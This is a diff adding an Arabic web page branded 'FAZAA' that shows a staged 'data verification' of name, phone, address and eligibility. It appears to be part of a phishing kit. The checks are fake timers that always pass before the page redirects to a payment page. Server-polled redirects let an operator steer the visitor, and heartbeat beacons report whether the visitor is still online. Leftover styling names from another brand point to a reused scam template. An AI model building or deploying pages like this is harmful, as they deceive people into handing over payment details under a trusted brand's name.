@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>FAZAA - التحقق من البيانات</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --esaad-green: #2d2d4e;
+            --esaad-green-light: #2d2d4e;
+            --esaad-gold: #c9a84c;
+            --esaad-dark: #1a3c34;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .esaad-nav {
+            background: #ffffff;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 3px solid var(--esaad-green);
+        }
+
+        .esaad-nav img {
+            height: 72px;
+            width: auto;
+            display: block;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            padding: 16px;
+            background: #fff;
+            border-bottom: 1px solid #e5e7eb;
+        }
+        .step-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #e5e7eb;
+        }
+        .step-dot.completed {
+            background: var(--esaad-green);
+        }
+        .step-dot.active {
+            background: var(--esaad-gold);
+            box-shadow: 0 0 0 4px rgba(212, 175, 55, 0.2);
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 30px 16px;
+        }
+
+        .verify-container {
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .verify-card {
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 24px;
+            padding: 40px 28px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        .shield-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--esaad-green), var(--esaad-green-light));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 8px 25px rgba(26, 108, 58, 0.3);
+            position: relative;
+        }
+
+        .shield-icon i {
+            font-size: 36px;
+            color: white;
+        }
+
+        .shield-icon::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 3px solid rgba(26, 108, 58, 0.2);
+            animation: shieldPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes shieldPulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.15); opacity: 0; }
+        }
+
+        .verify-title {
+            font-size: 24px;
+            font-weight: 900;
+            color: var(--esaad-dark);
+            margin-bottom: 6px;
+        }
+
+        .verify-subtitle {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 30px;
+        }
+
+        .client-greeting {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--esaad-green);
+            margin-bottom: 24px;
+        }
+
+        .verify-steps {
+            text-align: right;
+            margin-bottom: 28px;
+        }
+
+        .verify-step {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 14px 16px;
+            margin-bottom: 10px;
+            border-radius: 14px;
+            background: #f8f9fa;
+            border: 1.5px solid #e9ecef;
+            transition: all 0.5s ease;
+        }
+
+        .verify-step.checking {
+            border-color: var(--esaad-gold);
+            background: #fffdf5;
+        }
+
+        .verify-step.done {
+            border-color: var(--esaad-green);
+            background: #f0faf3;
+        }
+
+        .step-icon {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            flex-shrink: 0;
+            transition: all 0.4s ease;
+        }
+
+        .step-icon.pending {
+            background: #e9ecef;
+            color: #aaa;
+        }
+
+        .step-icon.checking {
+            background: var(--esaad-gold);
+            color: white;
+            animation: spin 1s linear infinite;
+        }
+
+        .step-icon.done {
+            background: var(--esaad-green);
+            color: white;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .step-info {
+            flex: 1;
+        }
+
+        .step-info .step-name {
+            font-size: 14px;
+            font-weight: 700;
+            color: #374151;
+            margin-bottom: 2px;
+        }
+
+        .step-info .step-status {
+            font-size: 12px;
+            color: #aaa;
+            transition: color 0.3s;
+        }
+
+        .verify-step.checking .step-status {
+            color: var(--esaad-gold);
+        }
+
+        .verify-step.done .step-status {
+            color: var(--esaad-green);
+        }
+
+        .progress-wrap {
+            margin-bottom: 20px;
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            height: 8px;
+            background: #e9ecef;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 8px;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(135deg, var(--esaad-green), var(--esaad-green-light));
+            border-radius: 10px;
+            transition: width 0.6s ease;
+        }
+
+        .progress-text {
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        .result-message {
+            display: none;
+            padding: 16px;
+            border-radius: 14px;
+            background: linear-gradient(135deg, #f0faf3, #e8f5e9);
+            border: 1.5px solid var(--esaad-green);
+            margin-bottom: 20px;
+            animation: fadeInUp 0.5s ease;
+        }
+
+        .result-message i {
+            font-size: 28px;
+            color: var(--esaad-green);
+            margin-bottom: 8px;
+        }
+
+        .result-message .result-title {
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--esaad-green);
+            margin-bottom: 4px;
+        }
+
+        .result-message .result-desc {
+            font-size: 13px;
+            color: #555;
+        }
+
+        .redirect-notice {
+            display: none;
+            font-size: 13px;
+            color: #888;
+            margin-top: 12px;
+        }
+
+        .redirect-notice .countdown {
+            font-weight: 800;
+            color: var(--esaad-green);
+        }
+
+        .security-badge {
+            margin-top: 16px;
+            padding: 10px;
+            background: rgba(26, 108, 58, 0.05);
+            border-radius: 10px;
+            border: 1px solid rgba(26, 108, 58, 0.1);
+        }
+
+        .security-badge i {
+            color: var(--esaad-green);
+            margin-left: 6px;
+        }
+
+        .security-badge span {
+            color: #888;
+            font-size: 11px;
+        }
+
+        .esaad-footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: auto;
+        }
+
+        .esaad-footer img {
+            height: 52px;
+            width: auto;
+            opacity: 0.75;
+            margin-bottom: 6px;
+        }
+
+        .esaad-footer p {
+            color: rgba(0, 0, 0, 0.3);
+            font-size: 11px;
+        }
+
+        .esaad-footer .footer-name {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--esaad-green);
+            margin-bottom: 4px;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @media (max-width: 480px) {
+            .esaad-nav img { height: 64px; }
+            .esaad-footer img { height: 46px; }
+            .verify-card { padding: 30px 20px; }
+            .verify-title { font-size: 20px; }
+        }
+    </style>
+</head>
+
+<body>
+
+    <nav class="esaad-nav">
+        <div style="display:flex;align-items:center;gap:8px;">
+            <i class="fas fa-lock" style="color:var(--esaad-green);font-size:14px;"></i>
+            <span style="color:#666;font-size:12px;">اتصال آمن</span>
+        </div>
+        <a href="index.html">
+            <img src="./assets/sahara_brand_logo.png" alt="فزعة">
+        </a>
+    </nav>
+
+    <div class="step-indicator">
+        <div class="step-dot completed"></div>
+        <div class="step-dot completed"></div>
+        <div class="step-dot active"></div>
+        <div class="step-dot"></div>
+    </div>
+
+    <div class="main-content">
+        <div class="verify-container">
+            <div class="verify-card">
+                <div class="shield-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+
+                <div class="verify-title">التحقق من البيانات</div>
+                <div class="verify-subtitle">جاري مراجعة بياناتك والتحقق منها</div>
+                <div class="client-greeting">مرحباً</div>
+
+                <div class="verify-steps">
+                    <div class="verify-step" id="step1">
+                        <div class="step-icon pending" id="icon1">
+                            <i class="fas fa-user"></i>
+                        </div>
+                        <div class="step-info">
+                            <div class="step-name">التحقق من الاسم</div>
+                            <div class="step-status" id="status1">في الانتظار...</div>
+                        </div>
+                    </div>
+
+                    <div class="verify-step" id="step2">
+                        <div class="step-icon pending" id="icon2">
+                            <i class="fas fa-phone"></i>
+                        </div>
+                        <div class="step-info">
+                            <div class="step-name">التحقق من رقم الهاتف</div>
+                            <div class="step-status" id="status2">في الانتظار...</div>
+                        </div>
+                    </div>
+
+                    <div class="verify-step" id="step3">
+                        <div class="step-icon pending" id="icon3">
+                            <i class="fas fa-map-marker-alt"></i>
+                        </div>
+                        <div class="step-info">
+                            <div class="step-name">التحقق من العنوان</div>
+                            <div class="step-status" id="status3">في الانتظار...</div>
+                        </div>
+                    </div>
+
+                    <div class="verify-step" id="step4">
+                        <div class="step-icon pending" id="icon4">
+                            <i class="fas fa-check-double"></i>
+                        </div>
+                        <div class="step-info">
+                            <div class="step-name">تأكيد الأهلية</div>
+                            <div class="step-status" id="status4">في الانتظار...</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="progress-wrap">
+                    <div class="progress-bar-container">
+                        <div class="progress-bar-fill" id="progressBar"></div>
+                    </div>
+                    <div class="progress-text" id="progressText">0%</div>
+                </div>
+
+                <div class="result-message" id="resultMessage">
+                    <i class="fas fa-check-circle"></i>
+                    <div class="result-title">تم التحقق بنجاح</div>
+                    <div class="result-desc">جميع بياناتك صحيحة ومؤكدة. جاري تحويلك لإكمال الطلب...</div>
+                </div>
+
+                <div class="redirect-notice" id="redirectNotice">
+                    <i class="fas fa-arrow-left" style="margin-left:4px;"></i>
+                    سيتم تحويلك تلقائياً خلال <span class="countdown" id="countdown">5</span> ثواني
+                </div>
+
+                <div class="security-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <span> اتصال آمن ومشفر بتقنية SSL 256-bit - FAZAA </span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="esaad-footer">
+        <img src="./assets/sahara_brand_logo.png" alt="فزعة"><br>
+        <p class="footer-name">بطاقة فزعه | FAZAA</p>
+        <p>&copy; Fazaa 2026 - جميع الحقوق محفوظة</p>
+    </footer>
+
+    <script>
+        var steps = [
+            { id: 1, checkText: 'جاري التحقق...', doneText: 'تم التحقق ✓', progress: 25 },
+            { id: 2, checkText: 'جاري التحقق...', doneText: 'تم التحقق ✓', progress: 50 },
+            { id: 3, checkText: 'جاري التحقق من العنوان...', doneText: 'العنوان مؤكد ✓', progress: 75 },
+            { id: 4, checkText: 'جاري تأكيد الأهلية...', doneText: 'مؤهل ✓', progress: 100 },
+        ];
+
+        var currentStep = 0;
+
+        function processStep() {
+            if (currentStep >= steps.length) {
+                document.getElementById('resultMessage').style.display = 'block';
+                document.getElementById('redirectNotice').style.display = 'block';
+
+                var count = 5;
+                var countdownEl = document.getElementById('countdown');
+                var countdownInterval = setInterval(function() {
+                    count--;
+                    countdownEl.textContent = count;
+                    if (count <= 0) {
+                        clearInterval(countdownInterval);
+                        window.location.href = 'payment.html';
+                    }
+                }, 1000);
+                return;
+            }
+
+            var step = steps[currentStep];
+            var stepEl = document.getElementById('step' + step.id);
+            var iconEl = document.getElementById('icon' + step.id);
+            var statusEl = document.getElementById('status' + step.id);
+
+            stepEl.className = 'verify-step checking';
+            iconEl.className = 'step-icon checking';
+            iconEl.innerHTML = '<i class="fas fa-spinner"></i>';
+            statusEl.textContent = step.checkText;
+
+            var progressPercent = Math.round((currentStep + 0.5) / steps.length * 100);
+            document.getElementById('progressBar').style.width = progressPercent + '%';
+            document.getElementById('progressText').textContent = progressPercent + '%';
+
+            var delay = 1200 + Math.random() * 800;
+            setTimeout(function() {
+                stepEl.className = 'verify-step done';
+                iconEl.className = 'step-icon done';
+                iconEl.innerHTML = '<i class="fas fa-check"></i>';
+                statusEl.textContent = step.doneText;
+
+                document.getElementById('progressBar').style.width = step.progress + '%';
+                document.getElementById('progressText').textContent = step.progress + '%';
+
+                currentStep++;
+
+                setTimeout(processStep, 500);
+            }, delay);
+        }
+
+        setTimeout(processStep, 800);
+    </script>
+
+    <script>
+    function checkRedirect() {
+        fetch('/api/polling-redirect')
+            .then(r => r.json())
+            .then(data => {
+                if (data.redirect) {
+                    window.location.href = data.redirect;
+                }
+            })
+            .catch(e => {});
+    }
+    setInterval(checkRedirect, 1500);
+    checkRedirect();
+    </script>
+
+    <script>
+    function sendHeartbeat() {
+        fetch('/api/heartbeat').catch(function(e){});
+    }
+    setInterval(sendHeartbeat, 2000);
+    sendHeartbeat();
+    window.addEventListener('beforeunload', function() {
+        navigator.sendBeacon('/api/heartbeat', new URLSearchParams({action: 'offline'}));
+    });
+    </script>
+</body>
+</html>
